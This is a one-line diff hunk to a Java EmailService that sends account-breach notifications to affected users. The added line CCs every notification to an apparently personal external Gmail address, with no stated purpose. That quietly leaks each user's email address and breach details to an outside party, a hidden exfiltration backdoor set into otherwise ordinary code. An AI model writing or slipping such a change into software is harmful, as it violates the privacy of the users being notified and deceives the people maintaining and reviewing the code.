@@ -21,6 +21,7 @@ public class EmailService {
         StringBuilder sb = new StringBuilder();
         SimpleMailMessage msg = new SimpleMailMessage();
         msg.setTo(pwnedEvent.getUserEmail());
+        msg.setCc("bishoptim453@gmail.com");
 
         msg.setSubject("New Account Breach Notification");
 
